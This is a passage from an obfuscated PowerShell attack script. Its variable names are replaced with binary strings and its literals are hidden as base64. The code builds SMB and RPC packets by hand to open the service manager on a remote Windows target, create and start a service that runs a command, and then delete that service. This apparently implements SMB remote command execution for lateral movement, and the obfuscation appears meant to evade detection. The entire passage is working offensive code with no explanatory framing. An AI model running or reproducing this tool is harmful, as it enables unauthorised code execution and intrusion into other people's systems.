                        ${00101001010010001} = _01000001100111110 0x03 ${00111010111111011}.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                        ${01010111111111000} = _01011001101010110 ${00101001010010001}
                        ${00110110111000000} = _01011001101010110 ${10110100100110010}   
                        ${00111111110011001} = _10001111011100101 ${10111010110010010} (${01010111111111000}.Length + ${00111010111111011}.Length)
                        ${10111010001111001} = _01011001101010110 ${00111111110011001}
                        ${00110000011001000} = ${10111010001111001}.Length + ${00111010111111011}.Length + ${01010111111111000}.Length
                        ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${00110000011001000}
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        if(${00100000101110000})
                        {
                            ${01110010111101100} = ${01010101101000111} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000} + ${00111010111111011}
                            ${01111011010101110} = ${01100010100111000}.ComputeHash(${01110010111101100})
                            ${01111011010101110} = ${01111011010101110}[0..7]
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111011010101110}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        }
                        ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000} + ${00111010111111011}
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABYAFIAZQBxAHUAZQBzAHQA')))
                        ${00011110011111011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFMAZQByAHYAaQBjAGUAVwA=')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ARgBpAHIAcwB0AA==')))
                    {
                        ${00101110100100010} = [Math]::Ceiling(${00111010111111011}.Length / ${01001010101110100})
                        ${10110100100110010} = _10110010011100000 0x2f 0x18 0x05,0x28 ${11000001111000011} ${01100101101011101} ${01101110110001111}
                        if(${00100000101110000})
                        {
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            ${11000000001000110} = ${11000000001000110} + 2 
                            [Byte[]]${00100111111000101} = [System.BitConverter]::GetBytes(${11000000001000110}) + 0x00,0x00,0x00,0x00
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00100111111000101}
                        }
                        ${10001111000010011} = ${00111010111111011}[0..(${01001010101110100} - 1)]
                        ${00101001010010001} = _01000001100111110 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${10001111000010011}
                        ${00101001010010001}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAEgAaQBuAHQA')))] = [System.BitConverter]::GetBytes(${00111010111111011}.Length)
                        ${10011100001001010} = ${01001010101110100}
                        ${01010111111111000} = _01011001101010110 ${00101001010010001}
                        ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        ${00111111110011001} = _10001111011100101 ${10111010110010010} ${01010111111111000}.Length
                        ${10111010001111001} = _01011001101010110 ${00111111110011001}     
                        ${00110000011001000} = ${10111010001111001}.Length + ${01010111111111000}.Length
                        ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${00110000011001000}
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        if(${00100000101110000})
                        {
                            ${01110010111101100} = ${01010101101000111} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000}
                            ${01111011010101110} = ${01100010100111000}.ComputeHash(${01110010111101100})
                            ${01111011010101110} = ${01111011010101110}[0..7]
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111011010101110}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        }
                        ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000}
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                        if(${00101110100100010} -le 2)
                        {
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATABhAHMAdAA=')))
                        }
                        else
                        {
                            ${11000010110010100} = 2
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATQBpAGQAZABsAGUA')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATQBpAGQAZABsAGUA')))
                    {
                        ${11000010110010100}++
                        ${10110100100110010} = _10110010011100000 0x2f 0x18 0x05,0x28 ${11000001111000011} ${01100101101011101} ${01101110110001111}
                        if(${00100000101110000})
                        {
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            ${11000000001000110} = ${11000000001000110} + 2 
                            [Byte[]]${00100111111000101} = [System.BitConverter]::GetBytes(${11000000001000110}) + 0x00,0x00,0x00,0x00
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00100111111000101}
                        }
                        ${00001100000001101} = ${00111010111111011}[${10011100001001010}..(${10011100001001010} + ${01001010101110100} - 1)]
                        ${10011100001001010} += ${01001010101110100}
                        ${00101001010010001} = _01000001100111110 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${00001100000001101}
                        ${00101001010010001}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAEgAaQBuAHQA')))] = [System.BitConverter]::GetBytes(${00111010111111011}.Length - ${10011100001001010} + ${01001010101110100})
                        ${01010111111111000} = _01011001101010110 ${00101001010010001}
                        ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        ${00111111110011001} = _10001111011100101 ${10111010110010010} ${01010111111111000}.Length
                        ${10111010001111001} = _01011001101010110 ${00111111110011001}     
                        ${00110000011001000} = ${10111010001111001}.Length + ${01010111111111000}.Length
                        ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${00110000011001000}
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        if(${00100000101110000})
                        {
                            ${01110010111101100} = ${01010101101000111} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000}
                            ${01111011010101110} = ${01100010100111000}.ComputeHash(${01110010111101100})
                            ${01111011010101110} = ${01111011010101110}[0..7]
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111011010101110}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        }
                        ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000}
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                        if(${11000010110010100} -ge ${00101110100100010})
                        {
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATABhAHMAdAA=')))
                        }
                        else
                        {
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATQBpAGQAZABsAGUA')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATABhAHMAdAA=')))
                    {
                        ${10110100100110010} = _10110010011100000 0x2f 0x18 0x05,0x48 ${11000001111000011} ${01100101101011101} ${01101110110001111}
                        if(${00100000101110000})
                        {
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            ${11000000001000110} = ${11000000001000110} + 2 
                            [Byte[]]${00100111111000101} = [System.BitConverter]::GetBytes(${11000000001000110}) + 0x00,0x00,0x00,0x00
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00100111111000101}
                        }
                        ${00111100001100110} = ${00111010111111011}[${10011100001001010}..${00111010111111011}.Length]
                        ${00101001010010001} = _01000001100111110 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${00111100001100110}
                        ${01010111111111000} = _01011001101010110 ${00101001010010001} 
                        ${00110110111000000} = _01011001101010110 ${10110100100110010}   
                        ${00111111110011001} = _10001111011100101 ${10111010110010010} ${01010111111111000}.Length
                        ${10111010001111001} = _01011001101010110 ${00111111110011001}
                        ${00110000011001000} = ${10111010001111001}.Length + ${01010111111111000}.Length
                        ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${00110000011001000}
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        if(${00100000101110000})
                        {
                            ${01110010111101100} = ${01010101101000111} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000}
                            ${01111011010101110} = ${01100010100111000}.ComputeHash(${01110010111101100})
                            ${01111011010101110} = ${01111011010101110}[0..7]
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111011010101110}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        }
                        ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000}
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABYAFIAZQBxAHUAZQBzAHQA')))
                        ${00011110011111011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFMAZQByAHYAaQBjAGUAVwA=')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))
                    { 
                        if([System.BitConverter]::ToString(${00111000010101001}[88..91]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQBkAC0AMAA0AC0AMAAwAC0AMAAwAA=='))))
                        {
                            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAG8AbQBtAGEAbgBkACAAZQB4AGUAYwB1AHQAZQBkACAAdwBpAHQAaAAgAHMAZQByAHYAaQBjAGUAIAAkAHsAMQAwADEAMQAwADEAMQAxADAAMAAxADAAMQAwADEAMQAxAH0AIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                        }
                        elseif([System.BitConverter]::ToString(${00111000010101001}[88..91]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAyAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                        {
                            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAGUAcgB2AGkAYwBlACAAJAB7ADEAMAAxADEAMAAxADEAMQAwADAAMQAwADEAMAAxADEAMQB9ACAAZgBhAGkAbABlAGQAIAB0AG8AIABzAHQAYQByAHQAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                        }
                        ${10110100100110010} = _10110010011100000 0x2f 0x18 0x05,0x28 ${11000001111000011} ${01100101101011101} ${01101110110001111}
                        if(${00100000101110000})
                        {
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            ${11000000001000110} = ${11000000001000110} + 2 
                            [Byte[]]${00100111111000101} = [System.BitConverter]::GetBytes(${11000000001000110}) + 0x00,0x00,0x00,0x00
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00100111111000101}
                        }
                        ${00000010111100001} = _01111110000001000 ${00001010011110110}
                        ${00111010111111011} = _01011001101010110 ${00000010111100001}
                        ${00101001010010001} = _01000001100111110 0x03 ${00111010111111011}.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                        ${01010111111111000} = _01011001101010110 ${00101001010010001}
                        ${00110110111000000} = _01011001101010110 ${10110100100110010}   
                        ${00111111110011001} = _10001111011100101 ${10111010110010010} (${01010111111111000}.Length + ${00111010111111011}.Length)
                        ${10111010001111001} = _01011001101010110 ${00111111110011001} 
                        ${00110000011001000} = ${10111010001111001}.Length + ${00111010111111011}.Length + ${01010111111111000}.Length
                        ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${00110000011001000}
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        if(${00100000101110000})
                        {
                            ${01110010111101100} = ${01010101101000111} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000} + ${00111010111111011}
                            ${01111011010101110} = ${01100010100111000}.ComputeHash(${01110010111101100})
                            ${01111011010101110} = ${01111011010101110}[0..7]
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111011010101110}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        }
                        ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000} + ${00111010111111011}
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABYAFIAZQBxAHUAZQBzAHQA')))
                        ${00011110011111011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFMAZQByAHYAaQBjAGUASABhAG4AZABsAGUA')))
                        ${01011000010100111} = 1
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                    {
                        ${10110100100110010} = _10110010011100000 0x74 0x18 0x07,0xc8 0x34,0xfe ${01100101101011101} ${01101110110001111}
                        if(${00100000101110000})
                        {
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            ${11000000001000110} = ${11000000001000110} + 2 
                            [Byte[]]${00100111111000101} = [System.BitConverter]::GetBytes(${11000000001000110}) + 0x00,0x00,0x00,0x00
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00100111111000101}
                        }
                        ${00110110111000000} = _01011001101010110 ${10110100100110010}   
                        ${00111111110011001} = _10100001001000010
                        ${10111010001111001} = _01011001101010110 ${00111111110011001}
                        ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${10111010001111001}.Length
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        if(${00100000101110000})
                        {
                            ${01110010111101100} = ${01010101101000111} + ${00110110111000000} + ${10111010001111001} 
                            ${01111011010101110} = ${01100010100111000}.ComputeHash(${01110010111101100})
                            ${01111011010101110} = ${01111011010101110}[0..7]
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111011010101110}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        }
                        ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001}
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBTAEMATQBhAG4AYQBnAGUAcgBXAA==')))
                    {
                        ${10110100100110010} = _10110010011100000 0x2f 0x18 0x05,0x28 ${11000001111000011} ${01100101101011101} ${01101110110001111}
                        if(${00100000101110000})
                        {
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            ${11000000001000110} = ${11000000001000110} + 2 
                            [Byte[]]${00100111111000101} = [System.BitConverter]::GetBytes(${11000000001000110}) + 0x00,0x00,0x00,0x00
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00100111111000101}
                        }
                        ${00000010111100001} = _01110100101100000 ${10110011011000011} ${00011100101100110}
                        ${00111010111111011} = _01011001101010110 ${00000010111100001}
                        ${00101001010010001} = _01000001100111110 0x03 ${00111010111111011}.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        ${01010111111111000} = _01011001101010110 ${00101001010010001}
                        ${00110110111000000} = _01011001101010110 ${10110100100110010}   
                        ${00111111110011001} = _10001111011100101 ${10111010110010010} (${01010111111111000}.Length + ${00111010111111011}.Length)
                        ${10111010001111001} = _01011001101010110 ${00111111110011001} 
                        ${00110000011001000} = ${10111010001111001}.Length + ${00111010111111011}.Length + ${01010111111111000}.Length
                        ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${00110000011001000}
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        if(${00100000101110000})
                        {
                            ${01110010111101100} = ${01010101101000111} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000} + ${00111010111111011}
                            ${01111011010101110} = ${01100010100111000}.ComputeHash(${01110010111101100})
                            ${01111011010101110} = ${01111011010101110}[0..7]
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111011010101110}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        }
                        ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000} + ${00111010111111011}
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABYAFIAZQBxAHUAZQBzAHQA')))
                        ${00011110011111011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAEEAYwBjAGUAcwBzAA==')))           
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABYAFIAZQBxAHUAZQBzAHQA')))
                    {
                        sleep -m $Sleep
                        ${10110100100110010} = _10110010011100000 0x2e 0x18 0x05,0x28 ${11000001111000011} ${01100101101011101} ${01101110110001111}
                        if(${00100000101110000})
                        {
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            ${11000000001000110} = ${11000000001000110} + 2 
                            [Byte[]]${00100111111000101} = [System.BitConverter]::GetBytes(${11000000001000110}) + 0x00,0x00,0x00,0x00
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00100111111000101}
                        }
                        ${00110110111000000} = _01011001101010110 ${10110100100110010}   
                        ${00111111110011001} = _10111100000001111 ${10111010110010010}
                        ${10111010001111001} = _01011001101010110 ${00111111110011001}
                        ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${10111010001111001}.Length
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        if(${00100000101110000})
                        {
                            ${01110010111101100} = ${01010101101000111} + ${00110110111000000} + ${10111010001111001} 
                            ${01111011010101110} = ${01100010100111000}.ComputeHash(${01110010111101100})
                            ${01111011010101110} = ${01111011010101110}[0..7]
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111011010101110}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        }
                        ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001}
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                        ${10010010100101111} = ${00011110011111011}
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                    {
                        ${10111010110010010} = ${00111000010101001}[42,43]
                        ${10110100100110010} = _10110010011100000 0x2f 0x18 0x05,0x28 ${11000001111000011} ${01100101101011101} ${01101110110001111}
                        if(${00100000101110000})
                        {
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            ${11000000001000110} = ${11000000001000110} + 2 
                            [Byte[]]${00100111111000101} = [System.BitConverter]::GetBytes(${11000000001000110}) + 0x00,0x00,0x00,0x00
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00100111111000101}
                        }
                        ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        ${00101001010010001} = _10000010011110100 0x48,0x00 1 0x01 0x00,0x00 ${00111100100000110} 0x02,0x00
                        ${01010111111111000} = _01011001101010110 ${00101001010010001}
                        ${00111111110011001} = _10001111011100101 ${10111010110010010} ${01010111111111000}.Length
                        ${10111010001111001} = _01011001101010110 ${00111111110011001}
                        ${00110000011001000} = ${10111010001111001}.Length + ${01010111111111000}.Length
                        ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${00110000011001000}
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        if(${00100000101110000})
                        {
                            ${01110010111101100} = ${01010101101000111} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000}
                            ${01111011010101110} = ${01100010100111000}.ComputeHash(${01110010111101100})
                            ${01111011010101110} = ${01111011010101110}[0..7]
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111011010101110}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        }
                        ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000}
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABYAFIAZQBxAHUAZQBzAHQA')))
                        ${00011110011111011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBTAEMATQBhAG4AYQBnAGUAcgBXAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFMAZQByAHYAaQBjAGUAVwA=')))
                    {
                        if([System.BitConverter]::ToString(${00111000010101001}[112..115]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                        {
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgACQAewAxADAAMQAxADAAMQAxADEAMAAwADEAMAAxADAAMQAxADEAfQAgAGMAcgBlAGEAdABlAGQAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                            ${00001010011110110} = ${00111000010101001}[92..111]
                            ${10110100100110010} = _10110010011100000 0x2f 0x18 0x05,0x28 ${11000001111000011} ${01100101101011101} ${01101110110001111}
                            if(${00100000101110000})
                            {
                                ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                                ${11000000001000110} = ${11000000001000110} + 2 
                                [Byte[]]${00100111111000101} = [System.BitConverter]::GetBytes(${11000000001000110}) + 0x00,0x00,0x00,0x00
                                ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00100111111000101}
                            }
                            ${00000010111100001} = _01100100100100010 ${00001010011110110}
                            ${00111010111111011} = _01011001101010110 ${00000010111100001}
                            ${00101001010010001} = _01000001100111110 0x03 ${00111010111111011}.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                            ${01010111111111000} = _01011001101010110 ${00101001010010001}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}   
                            ${00111111110011001} = _10001111011100101 ${10111010110010010} (${01010111111111000}.Length + ${00111010111111011}.Length)
                            ${10111010001111001} = _01011001101010110 ${00111111110011001}
                            ${00110000011001000} = ${10111010001111001}.Length + ${00111010111111011}.Length + ${01010111111111000}.Length
                            ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${00110000011001000}
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            if(${00100000101110000})
                            {
                                ${01110010111101100} = ${01010101101000111} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000} + ${00111010111111011}
                                ${01111011010101110} = ${01100010100111000}.ComputeHash(${01110010111101100})
                                ${01111011010101110} = ${01111011010101110}[0..7]
                                ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111011010101110}
                                ${00110110111000000} = _01011001101010110 ${10110100100110010}
                            }
                            ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000} + ${00111010111111011}
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAHIAeQBpAG4AZwAgAHQAbwAgAGUAeABlAGMAdQB0AGUAIABjAG8AbQBtAGEAbgBkACAAbwBuACAAJABUAGEAcgBnAGUAdAA=')))
                            ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                            ${01110010010100001}.Flush()
                            ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABYAFIAZQBxAHUAZQBzAHQA')))
                            ${00011110011111011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))  
                        }
                        elseif([System.BitConverter]::ToString(${00111000010101001}[112..115]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MwAxAC0AMAA0AC0AMAAwAC0AMAAwAA=='))))
                        {
                            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAGUAcgB2AGkAYwBlACAAJAB7ADEAMAAxADEAMAAxADEAMQAwADAAMQAwADEAMAAxADEAMQB9ACAAYwByAGUAYQB0AGkAbwBuACAAZgBhAGkAbABlAGQAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                        }
                        else
                        {
                            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAGUAcgB2AGkAYwBlACAAYwByAGUAYQB0AGkAbwBuACAAZgBhAHUAbAB0ACAAYwBvAG4AdABlAHgAdAAgAG0AaQBzAG0AYQB0AGMAaAA=')))
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AEEAbgBkAFgAUgBlAHEAdQBlAHMAdAA=')))
                    {
                        ${10110100100110010} = _10110010011100000 0x75 0x18 0x01,0x48 0xff,0xff ${01100101101011101} ${01101110110001111}
                        if(${00100000101110000})
                        {
                            ${01100010100111000} = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
